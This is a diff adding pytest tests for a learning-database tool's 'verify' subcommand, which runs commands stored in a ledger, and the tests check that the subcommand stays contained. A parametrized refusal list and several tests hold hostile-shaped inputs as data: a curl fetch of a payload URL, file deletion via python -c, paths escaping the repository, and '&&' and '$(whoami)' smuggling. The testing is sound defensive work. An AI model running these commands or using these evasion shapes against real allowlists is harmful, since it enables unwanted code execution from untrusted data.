@@ -1,10 +1,12 @@
 """Tests for the learning database.
 
-Three concerns. **Durability**: the ledger is the record, and the database must
+Four concerns. **Durability**: the ledger is the record, and the database must
 be reconstructible from it exactly. **Discipline**: the guards that stop the
 database filling with junk or leaking credentials must be shown to fire.
 **Determinism**: retrieval and the generated views must be reproducible, because
-an unreproducible retrieval cannot be calibrated.
+an unreproducible retrieval cannot be calibrated. **Containment**: `verify`
+executes strings that came out of a data file, so every refusal it is supposed to
+make is driven here with a command that must not run.
 
     pytest tools/test_learn.py
 """
@@ -15,7 +17,6 @@ import datetime as dt
 import json
 import shutil
 import sqlite3
-from collections.abc import Sequence
 from pathlib import Path
 
 import pytest
@@ -275,6 +276,23 @@ def test_retrieval_respects_the_budget(store: learn.Store) -> None:
     assert sum(len(c.render()) for c in found) // 4 <= budget * 1.5
 
 
+def test_retrieval_has_a_machine_readable_form(capsys: pytest.CaptureFixture[str],
+                                               store: learn.Store) -> None:
+    """`--json` prints the candidates as data, for a caller that is not a person.
+
+    Pinned because the candidates are slotted dataclasses: an instance dictionary
+    is exactly what they do not have, so serialising them the obvious way raises
+    only once something actually matched, which is the worst time to find out.
+    """
+    # Stamped now, and matched against a path with the depth the default trigger
+    # asks for: the subcommand reads the system date, so an entry dated in the
+    # fixture's past would decay out of the answer as the calendar moves.
+    record(store, ts=learn.now_iso())
+    assert learn.main(["--root", str(store.root), "retrieve",
+                       "--file", "src/pkg/a.py", "--json"]) == 0
+    assert json.loads(capsys.readouterr().out)[0]["id"] == "L-0001"
+
+
 def test_a_retired_learning_is_not_offered(store: learn.Store) -> None:
     """Refuted entries stay in the log for audit, not for advice."""
     first = record(store)
@@ -393,6 +411,325 @@ def test_an_outcome_for_an_unknown_learning_is_ignored(store: learn.Store) -> No
     """
     learn.append_event(store, "use", "S-1", {"ref": "L-9999", "outcome": "helped"})
     assert states(store) == {}
+
+
+# ----------------------------------------------------------------- verification
+
+
+def script(store: learn.Store, name: str, body: str) -> str:
+    """Write a one-line program into the store's root and name the command that runs it.
+
+    The store's root is the working directory a verification runs in, so a bare
+    relative name is what the allowlist sees and what the interpreter finds.
+
+    @param store the store whose root the program is written into
+    @param name the file to write, which must end in the Python suffix to be admitted
+    @param body the program text
+    @return the command a learning would record to run it
+    """
+    (store.root / name).write_text(body, encoding="utf-8")
+    return f"python {name}"
+
+
+def verified(store: learn.Store, command: str) -> list[learn.VerifyResult]:
+    """Record one learning carrying `command` and run the verification pass over it.
+
+    @param store the database to record into
+    @param command the verification command to attach
+    @return the results, one per live entry carrying a command
+    """
+    record(store, verification=command)
+    connection = learn.sync(store)
+    results = learn.verify(store, connection, execute=True, timeout=20)
+    connection.close()
+    return results
+
+
+def test_a_dry_run_starts_nothing(store: learn.Store) -> None:
+    """The default reports what would run, and runs none of it.
+
+    The proof is a side effect: the program writes a file, and after a dry run
+    that file must not exist. Executing by default would make a ledger arriving
+    from another repository into a way to run code here.
+    """
+    command = script(store, "ran.py", "open('sentinel', 'w').write('x')\n")
+    record(store, verification=command)
+    connection = learn.sync(store)
+    results = learn.verify(store, connection)
+    connection.close()
+    assert [r.outcome for r in results] == ["skipped"]
+    assert not (store.root / "sentinel").exists()
+    assert "would run" in results[0].detail
+
+
+def test_an_executed_verification_carries_its_exit_status(store: learn.Store) -> None:
+    """With the opt-in flag the command runs, and a clean exit reads as passed."""
+    command = script(store, "ok.py", "open('sentinel', 'w').write('x')\n")
+    results = verified(store, command)
+    assert [(r.outcome, r.code) for r in results] == [("passed", 0)]
+    assert (store.root / "sentinel").exists()
+
+
+def test_a_failing_verification_is_data_not_a_crash(store: learn.Store) -> None:
+    """A command that exits non-zero is reported, with its status and its last output line.
+
+    This is the whole point of the subcommand: the failure is the measurement, so
+    it must never propagate as an exception.
+    """
+    command = script(store, "bad.py", "import sys\nprint('the claim moved')\nsys.exit(3)\n")
+    results = verified(store, command)
+    assert [(r.outcome, r.code) for r in results] == [("failed", 3)]
+    assert "the claim moved" in results[0].detail
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "curl https://example.invalid/payload",
+        'python -c "import os; os.remove(\'x\')"',
+        "python -",
+        "python",
+        "sh -c ls",
+        "/usr/bin/python evil.py",
+        "./python evil.py",
+        "python ../outside.py",
+        "python -m os",
+        "python -m subprocess",
+        "pytest ../next-door/test_x.py",
+        "python -m pytest ../next-door",
+        "doxygen ../next-door/Doxyfile",
+        "ruff check --config=../next-door/ruff.toml .",
+        "pytest ..",
+    ],
+)
+def test_a_command_outside_the_allowlist_is_refused(store: learn.Store,
+                                                    command: str) -> None:
+    """Fifteen shapes an untrusted ledger would use are each refused, by name.
+
+    A ledger can arrive from another repository through `vendor` and `harvest`,
+    so this is the proof-of-failure companion the allowlist needs (FLOW-007): an
+    arbitrary program, an interpreter carrying its own program, a path-qualified
+    executable, a script outside the tree, a module reaching the standard
+    library, and an argument pointing out of the tree at a file the admitted
+    program would then execute. The refusal has to name what it refused; a silent
+    skip would leave the reader believing the entry verified.
+    """
+    results = verified(store, command)
+    assert [r.outcome for r in results] == ["refused"], results[0].detail
+    assert results[0].command == command
+    assert results[0].detail
+
+
+def test_a_refusal_is_reported_rather_than_run(store: learn.Store) -> None:
+    """The refused command's side effect must not have happened.
+
+    Checking the outcome word alone would pass even if the command had run and
+    then been labelled refused, so the file the program would have written is
+    what is actually asserted.
+    """
+    (store.root / "evil.py").write_text("open('breach', 'w').write('x')\n", encoding="utf-8")
+    results = verified(store, "/usr/bin/python evil.py")
+    assert results[0].outcome == "refused"
+    assert not (store.root / "breach").exists()
+
+
+def test_an_admitted_program_may_not_be_pointed_out_of_the_tree(store: learn.Store) -> None:
+    """A neighbouring directory is where a harvested ledger's own repository sits.
+
+    `pytest` is on the allowlist and will execute any file it is given, so
+    bounding the entry point alone left `pytest ../next-door/test_x.py` running
+    code from outside the tree and reporting it as passed. The sentinel is
+    written outside the store, which is the only assertion that separates a
+    refusal from a run that was merely labelled one.
+    """
+    neighbour = store.root.parent / "next-door"
+    neighbour.mkdir(exist_ok=True)
+    breach = store.root.parent / "breach"
+    (neighbour / "test_evil.py").write_text(
+        f"open({str(breach)!r}, 'w').write('x')\ndef test_ok() -> None:\n    pass\n",
+        encoding="utf-8",
+    )
+    results = verified(store, "pytest ../next-door/test_evil.py")
+    assert results[0].outcome == "refused", results[0].detail
+    assert "outside the repository" in results[0].detail
+    assert not breach.exists()
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "ruff check",
+        "ruff check --config=ruff.toml .",
+        "python tools/build_graph.py --check",
+        "python -m pytest enforce/checks/test_doc_checks.py -q",
+        "doxygen enforce/Doxyfile",
+        "pytest -p no:cacheprovider tools",
+    ],
+)
+def test_an_ordinary_in_tree_command_is_still_admitted(store: learn.Store,
+                                                       command: str) -> None:
+    """The path bound must not refuse the commands the ledger actually carries.
+
+    Every one of these is a shape recorded in this repository's own ledger or a
+    near neighbour of one. A guard that refuses them would take the staleness
+    signal away from every honest entry to stop a dishonest one, which is the
+    trade this check exists to catch.
+    """
+    argv = learn.verification_argv(command)
+    assert learn.verification_refusal(argv, store.root) is None
+
+
+def test_no_shell_ever_sees_the_command(store: learn.Store) -> None:
+    """Shell syntax in the ledger arrives as a literal argument, not as syntax.
+
+    The command chains a second program with `&&`. Parsed rather than passed to a
+    shell, the chain becomes two more arguments to the first program, so the
+    second never starts -- which is what the sentinel file proves.
+    """
+    first = script(store, "first.py", "open('first-ran', 'w').write('x')\n")
+    (store.root / "second.py").write_text("open('breach', 'w').write('x')\n", encoding="utf-8")
+    results = verified(store, f"{first} && python second.py")
+    assert results[0].outcome == "passed"
+    assert (store.root / "first-ran").exists()
+    assert not (store.root / "breach").exists()
+    assert learn.verification_argv("python a.py $(whoami) | tee out") == [
+        "python", "a.py", "$(whoami)", "|", "tee", "out",
+    ]
+
+
+def test_unbalanced_quoting_is_refused_not_guessed(store: learn.Store) -> None:
+    """A command that will not parse is refused, rather than split on whitespace."""
+    with pytest.raises(learn.LearnError, match="cannot be parsed"):
+        learn.verification_argv('python "unclosed.py')
+    results = verified(store, 'python "unclosed.py')
+    assert results[0].outcome == "refused"
+
+
+def test_a_verification_that_never_ends_is_killed(store: learn.Store) -> None:
+    """A hung command is bounded, and the timeout is not a refutation.
+
+    A report that can hang is a report nobody runs unattended, and a machine that
+    was merely slow has said nothing about whether the claim still holds.
+    """
+    command = script(store, "hang.py", "import time\ntime.sleep(30)\n")
+    record(store, verification=command)
+    connection = learn.sync(store)
+    results = learn.verify(store, connection, execute=True, timeout=1)
+    connection.close()
+    assert results[0].outcome == "timeout"
+    assert learn.refute_failures(store, results, "S-9") == []
+
+
+def test_a_retired_learning_is_not_verified(store: learn.Store) -> None:
+    """A refuted entry is nobody's advice, so its staleness is not measured.
+
+    Verifying it again would append a second refutation on every run, which is
+    ledger noise saying nothing new.
+    """
+    command = script(store, "ok.py", "pass\n")
+    first = record(store, verification=command)
+    learn.append_event(store, "refute", "S-2", {"ref": first, "why": "wrong"})
+    connection = learn.sync(store)
+    assert learn.verify(store, connection, execute=True) == []
+    connection.close()
+
+
+def test_a_failure_refutes_only_when_asked(store: learn.Store) -> None:
+    """The refutation is a second opt-in, because refuting is a one-way door.
+
+    An executing run alone leaves the ledger exactly as it found it; only
+    `--refute-failures` appends, and then as the existing `refute` event so the
+    fold and the schema are untouched.
+    """
+    command = script(store, "bad.py", "raise SystemExit(2)\n")
+    first = record(store, verification=command)
+    before = len(learn.read_ledger(store))
+
+    assert learn.main(["--root", str(store.root), "verify", "--execute"]) == 0
+    assert len(learn.read_ledger(store)) == before
+    assert states(store)[first] == "candidate"
+
+    assert learn.main(
+        ["--root", str(store.root), "verify", "--execute", "--refute-failures"]
+    ) == 0
+    events = learn.read_ledger(store)
+    assert events[-1]["kind"] == "refute"
+    assert events[-1]["payload"]["ref"] == first
+    assert "exited 2" in events[-1]["payload"]["why"]
+    assert states(store)[first] == "refuted"
+
+
+def test_a_passing_verification_records_nothing(store: learn.Store) -> None:
+    """Success is not evidence, and is never written down.
+
+    Recording a success would be the reflexive "helped" this database refuses to
+    collect: a metric biased toward success is worse than no metric.
+    """
+    command = script(store, "ok.py", "pass\n")
+    record(store, verification=command)
+    before = len(learn.read_ledger(store))
+    assert learn.main(
+        ["--root", str(store.root), "verify", "--execute", "--refute-failures"]
+    ) == 0
+    assert len(learn.read_ledger(store)) == before
+
+
+def test_refuting_without_executing_is_refused(store: learn.Store) -> None:
+    """Nothing ran, so there is nothing to refute; the command says so and stops."""
+    assert learn.main(["--root", str(store.root), "verify", "--refute-failures"]) == 1
+
+
+def test_only_a_real_failure_refutes(store: learn.Store) -> None:
+    """A refusal or a missing program says the check could not run here.
+
+    That is a fact about this machine, not about the claim, so it must not retire
+    an entry -- which is the difference between measuring staleness and
+    manufacturing it.
+    """
+    results = [
+        learn.VerifyResult("L-0001", "curl x", "refused", "not allowlisted"),
+        learn.VerifyResult("L-0002", "doxygen x", "unavailable", "not installed"),
+        learn.VerifyResult("L-0003", "python x.py", "skipped", "would run"),
+    ]
+    assert learn.refute_failures(store, results, "S-9") == []
+    assert learn.read_ledger(store) == []
+
+
+def test_the_verify_report_has_a_machine_readable_form(
+        capsys: pytest.CaptureFixture[str], store: learn.Store) -> None:
+    """`--json` carries the outcome and the exit status, for a gate to read."""
+    record(store, verification=script(store, "bad.py", "raise SystemExit(4)\n"))
+    assert learn.main(["--root", str(store.root), "verify", "--execute", "--json"]) == 0
+    payload = json.loads(capsys.readouterr().out)
+    assert [(r["outcome"], r["code"]) for r in payload] == [("failed", 4)]
+
+
+def test_a_machine_read_report_still_carries_the_refusals_and_the_caveat(
+        capsys: pytest.CaptureFixture[str], store: learn.Store) -> None:
+    """`--json` keeps stdout parsable without going quiet about what it refused.
+
+    A gate reads this form, and a gate is exactly the reader that would record
+    "verified" over a run where nothing was allowed to start. The refusal and the
+    caveat therefore go to stderr, where they cost the parser nothing.
+    """
+    record(store, verification="curl https://example.invalid/payload")
+    assert learn.main(["--root", str(store.root), "verify", "--json"]) == 0
+    captured = capsys.readouterr()
+    assert [r["outcome"] for r in json.loads(captured.out)] == ["refused"]
+    assert "REFUSED" in captured.err
+    assert "does not prove the claim" in captured.err
+
+
+def test_the_report_states_what_a_pass_does_not_prove(capsys: pytest.CaptureFixture[str],
+                                                      store: learn.Store) -> None:
+    """The caveat is printed with every report, where a reader cannot miss it.
+
+    A green verification pass invites the reading that the claims were confirmed.
+    They were not: the command is a proxy the recording agent chose.
+    """
+    record(store, verification=script(store, "ok.py", "pass\n"))
+    assert learn.main(["--root", str(store.root), "verify"]) == 0
+    assert "does not prove the claim" in capsys.readouterr().out
 
 
 # ------------------------------------------------------------ generated views
